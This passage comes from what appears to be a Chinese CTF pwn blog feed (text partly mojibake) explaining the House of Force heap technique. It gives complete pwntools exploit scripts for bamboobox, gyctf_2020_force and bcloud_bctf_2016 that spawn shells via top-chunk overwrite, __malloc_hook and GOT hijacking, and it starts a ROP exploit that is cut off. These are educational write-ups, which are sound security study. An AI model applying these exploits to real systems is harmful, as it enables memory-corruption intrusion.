(s)))</code></pre></div><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top chunkçš„ æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼(write-anything-anywhere)ã€‚</p><h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><h3 id="è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹"><a href="#è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹" class="headerlink" title="è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹"></a>è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ¥ç¼©å°top chunk çš„æŒ‡é’ˆï¼Œæ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„æŸå¤„ä¸­çš„å†…å®¹ã€‚è¿™é‡Œå¯èƒ½æ˜¯heapçš„æŒ‡é’ˆï¼Œgotè¡¨ã€‚<strong>é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heapï¼Œå› ä¸ºheapçš„åœ°å€æ˜¯ç›¸å¯¹çš„ï¼Œä¸ä¼šæ”¶åˆ°åœ°å€éšæœºåŒ–çš„å½±å“ã€‚è€Œæ‰“gotçš„è¯ï¼Œå †çš„åœ°å€æ˜¯éšæœºçš„ï¼Œå¹¶æ— æ³•ç¡®å®šç”³è¯·å¤šå°‘size å¤§å°çš„å †ï¼Œå¯ä»¥æ”»å‡»åˆ°got</strong></p><p><strong>è¿™å…¶ä¸­æœ‰ä¸ªéš¾ç¼ çš„é—®é¢˜å°±æ˜¯ç»“æ„ä½“å¯¹é½é—®é¢˜ï¼Œç›®å‰æˆ‘æ‰€ç»ƒä¹ åˆ°çš„é¢˜é‡åˆ°è¿™ä¸ªé—®é¢˜çš„éƒ½æ˜¯ï¼Œå‡å»ä¸€ä¸‹<code>SIZE_SZ</code>ï¼ˆ64ä½æ˜¯8 ï¼Œ32ä½æ˜¯4ï¼‰ã€‚</strong></p><h3 id="è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"><a href="#è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹" class="headerlink" title="è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"></a>è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ˜¯è¾ƒå¥½ç†è§£çš„ï¼Œå¸¸ç”¨ä¿®æ”¹libcä¸Šé¢æŸå¤„çš„åœ°å€ã€‚</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>ä¸»è¦æ˜¯ä¿®æ”¹ä¸€ä¸‹ï¼Œå¼€å§‹ç¨‹åºè‡ªåŠ¨åˆ›å»ºçš„å­˜æ”¾2ä¸ªå‡½æ•°æŒ‡é’ˆçš„å †ï¼Œå…¶ä¸­hello-messageç”¨äºç¨‹åºå¼€å§‹æ—¶ä½¿ç”¨ï¼Œgoodbye-message ç”¨äºåœ¨ç¨‹åºç»“æŸæ—¶ä½¿ç”¨ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>æ·»åŠ å †å—ï¼Œåˆ©ç”¨å †æº¢å‡ºæ¼æ´è¦†ç›– top chunk çš„å¤§å°ä¸º -1ï¼Œå³ 64 ä½æœ€å¤§å€¼ã€‚</li><li>åˆ©ç”¨ house of force æŠ€å·§ï¼Œåˆ†é… chunk è‡³å †çš„åŸºåœ°å€ã€‚</li><li>è¦†ç›– goodbye-message ä¸ºmagic å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25784</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'item name:'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,size,content)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'item'</span>,str(id))    sla(<span class="hljs-string">'item name'</span>,str(size))    sa(<span class="hljs-string">'item'</span>,str(content))context.log_level = <span class="hljs-string">'debug'</span>magic = <span class="hljs-number">0x400d49</span>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'chum'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> +p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,payload)size = -(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x20</span>) - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">' '</span>)payload = p64(<span class="hljs-number">0x400d49</span>) + p64(<span class="hljs-number">0x400d49</span>)add(<span class="hljs-number">0x10</span>,payload)<span class="hljs-comment"># sla('choice:','5')</span>itr()</code></pre></div><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>å¯ä»¥å®ç°å †æº¢å‡ºã€‚å¹¶ä¸”åœ¨ä½ ç”³è¯·ä¸€ä¸ªå †å—ä»¥åï¼Œç¨‹åºä¼šç»™ä½ æ‰“å°å‡ºå †å—çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²å‡ºä¿¡æ¯ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>ç”³è¯·ä¸€ä¸ªå¾ˆå¤§å †ï¼Œç„¶åç¨‹åºä¼šmmapå¼€å¯ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶å°±å¯ä»¥æ³„æ¼å‡ºlibcçš„åœ°å€ã€‚</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>local_file  = <span class="hljs-string">'./gyctf_2020_force'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29457</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,date)</span>:</span>    sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    ru(<span class="hljs-string">'bin addr 0x'</span>)    heapaddr = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)    info_addr(<span class="hljs-string">'heapaddr'</span>,heapaddr)    sa(<span class="hljs-string">'content'</span>,str(date))    <span class="hljs-keyword">return</span> heapaddrpayload = <span class="hljs-number">0x30</span> * <span class="hljs-string">'a'</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">'111'</span>) + <span class="hljs-number">0x200ff0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = libc_base + <span class="hljs-number">0x3c4b10</span>heapaddr = add(<span class="hljs-number">0x30</span>,payload)size = malloc_hook-(heapaddr + <span class="hljs-number">0x30</span>) - <span class="hljs-number">0x10</span> - <span class="hljs-number">0x8</span> <span class="hljs-number">-0x8</span> <span class="hljs-number">-0x8</span>print(<span class="hljs-string">'size----&gt;'</span>+hex(size))add(size,<span class="hljs-string">'a'</span>)rce = rce16[<span class="hljs-number">1</span>] + libc_basepayload = p64(<span class="hljs-number">0</span>) + p64(rce) + p64(libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>] + realloc[<span class="hljs-number">1</span>])add(<span class="hljs-number">0x20</span>,payload)sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'30'</span>)<span class="hljs-comment"># dbg()</span>itr()</code></pre></div><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªååˆ†ç²¾å¦™çš„é¢˜ï¼Œæ¼æ´å‡ºç°åœ¨ç¨‹åºåˆå§‹åŒ–ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpyæ˜¯ä»¥<code>\x00</code>æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç»“æŸçš„ã€‚<br>åœ¨æ ˆä¸­ï¼Œå½“è¾“å…¥0x40ä¸ªå­—ç¬¦æ—¶ï¼Œå› ä¸ºv2æ­£å¥½åœ¨sä¸‹é¢ï¼Œè¿™å°±è®©strcpyä»så¾€v2ä¸Šé¢å¤åˆ¶æ—¶ä¼š<strong>æŠŠè¿™ä¸ªå †å—çš„åœ°å€ä¹Ÿç»™å¤åˆ¶ä¸Šå»</strong>ï¼Œå½“å…¶è¿”å›nameæ—¶ï¼Œä¹Ÿå°±è¿”å›äº†å †å—åœ°å€ï¼Œç„¶åå°±å¯ä»¥ç®—å‡ºå †å—çš„åŸºåœ°å€ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>åˆ°äº†è¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œå¡«å……å®Œ0x40ä¸ªå­—ç¬¦åï¼Œä¼šæŠŠorgå †å—çš„æŒ‡é’ˆå’Œv3é‡Œé¢çš„å†…å®¹ç»™å¤åˆ¶åˆ°orgå¯¹åº”çš„å †å—é‡Œï¼Œä¹Ÿå°±æ˜¯0x40 + 4 + len(v3)å­—èŠ‚çš„ä¸œè¥¿ã€‚orgåœ¨å †å—æ’å¸ƒä¸­ä¹Ÿæ˜¯æœ€åä¸€ä¸ªï¼Œå¦‚æœä¼ è¿‡å»<code>0xffffffff</code>,å°±å¯ä»¥æ”¹åˆ°top chunkçš„sizeä½ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-2"><a href="#åˆ©ç”¨æ€è·¯-2" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>leakå †å—base</li><li>ä¿®æ”¹top chunk size</li><li>hofåˆ°heaplistå¤„</li><li>ç»™heaplistå†™ä¸Šfree gotï¼Œç”¨editï¼Œä¿®æ”¹å…¶ä¸ºputs</li><li>æ³„æ¼libcåœ°å€</li><li>ä¿®æ”¹free got ä¸ºsystemï¼Œç„¶åæŒ‡å‘<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bcloud_bctf_2016'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27301</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span><span class="hljs-params">(name)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    ru(<span class="hljs-string">'b'</span>)    heapbase = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x8</span>    info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)    <span class="hljs-keyword">return</span> heapbase<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">org</span><span class="hljs-params">(org,host)</span>:</span>    sa(<span class="hljs-string">'Org:'</span>,str(org))    sla(<span class="hljs-string">'Host:'</span>,str(host))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'option---&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length'</span>,str(size))    sa(<span class="hljs-string">'content:'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,content)</span>:</span>    sla(<span class="hljs-string">'---&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))    sa(<span class="hljs-string">'the new content'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'-&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))context.log_level = <span class="hljs-string">'debug'</span>sizelist = <span class="hljs-number">0x804B0A0</span>heaplist = <span class="hljs-number">0x804B120</span>heapbase = name(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x40</span><span class="hljs-number">-1</span>) + <span class="hljs-string">'b'</span>)top = heapbase + <span class="hljs-number">0xd8</span>info_addr(<span class="hljs-string">'top'</span>,top)org(<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>,p32(<span class="hljs-number">0xffffffff</span>)) <span class="hljs-comment">#chang top chunk size</span>size = heaplist - top - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\n'</span>)payload = p32(<span class="hljs-number">0</span>) + p32(elf.got[<span class="hljs-string">'free'</span>]) + p32(elf.got[<span class="hljs-string">'atoi'</span>])  +p32(<span class="hljs-number">0x804B128</span>+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>) + <span class="hljs-string">'/bin/sh\x00'</span>edit(<span class="hljs-number">1</span>,payload + <span class="hljs-string">'\n'</span>)puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]edit(<span class="hljs-number">1</span>,p32(puts_plt) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">2</span>)io.recv(<span class="hljs-number">1</span>)io.recv(<span class="hljs-number">1</span>)atoi = uu32(r(<span class="hljs-number">4</span>))info_addr(<span class="hljs-string">'atoi'</span>,atoi)libc = LibcSearcher(<span class="hljs-string">'atoi'</span>,atoi)libc_base = atoi - libc.dump(<span class="hljs-string">'atoi'</span>)system = libc_base + libc.dump(<span class="hljs-string">'system'</span>)info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">1</span>,p32(system) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">3</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Houseç³»åˆ—</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(4th)</title>
    <link href="/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <url>/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-pwn"><a href="#DASCTFå®‰æ’æœˆèµ›-pwn" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›-pwn"></a>DASCTFå®‰æ’æœˆèµ›-pwn</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€èµ›äº†ï¼Œæœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ï¼Œæ™šä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/ctf/work/ahys/echo server/test'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>ç¨‹åºå¾ˆç®€å•ï¼Œç»å…¸æ ˆæº¢å‡ºï¼Œropåˆ©ç”¨å³å¯ã€‚<br>ä½†æ˜¯å› ä¸ºæ˜¯64ä½çš„ï¼Œå¹¶ä¸”æ˜¯glibc2.27ï¼Œå‘ç°åœ¨åšçš„æ—¶å€™æ„é€ ropé“¾æ€»æ˜¯ä¼šcurshï¼Œ<br>è°ƒè¯•å‘ç°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ±‡ç¼–ç›´æ¥ä¼šè®©ç¨‹åºcurshï¼Œæƒ³èµ·æ¥exå¸ˆå‚…ä¸€ç¯‡æ–‡ç« åˆ†æè¿‡ï¼Œ64ä½ç¨‹åºropåˆ°systemæ‹¿shellçš„æ—¶å€™ä¹Ÿä¼šè¿™æ ·ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªè¿™ä¸ªä¹Ÿå‡ºç°äº†ï¼Œç´¢æ€§å°è¯•ä¸€æ³¢ã€‚<br>è§£å†³åŠæ³•ï¼šè¿˜æ˜¯åŠ ä¸ªretï¼Œè®©æ ˆå¯¹å…¶å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./test'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    <span class="hljs-comment"># io = remote('node3.buuoj.cn',25390)</span>    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()pop_rdi = <span class="hljs-number">0x0000000000400823</span><span class="hljs-comment"># : pop rdi ; ret</span>offset = <span class="hljs-number">136</span>start = <span class="hljs-number">0x4005C0</span>ret = <span class="hljs-number">0x0400768</span>sla(<span class="hljs-string">'how long is your name:'</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,elf.got[<span class="hljs-string">'read'</span>],elf.plt[<span class="hljs-string">'printf'</span>],start])<span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)ru(<span class="hljs-string">'hello '</span>)read = uu64(r(<span class="hljs-number">6</span>))info_addr(<span 